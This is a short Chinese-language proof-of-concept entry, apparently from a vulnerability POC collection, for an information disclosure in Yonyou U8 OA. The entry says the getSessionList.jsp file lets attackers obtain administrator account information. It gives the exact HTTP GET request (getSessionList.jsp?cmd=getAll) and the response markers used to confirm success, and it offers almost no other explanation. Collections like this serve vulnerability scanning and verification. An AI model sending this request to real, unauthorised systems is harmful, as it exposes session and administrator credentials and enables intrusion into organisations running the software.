﻿# 用友 OA U8 getSessionList.jsp 信息泄露

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：用友 U8 OA getSessionList.jsp文件，通过漏洞攻击者可以获取数据库中管理员的账户信息

> 漏洞特征：

> 验证脚本：HTTP

```
GET /yyoa/ext/https/getSessionList.jsp?cmd=getAll HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：1

> 上传文件定位：

> 验证文件来源：用友 OA U8 getSessionList.jsp 信息泄露.poc
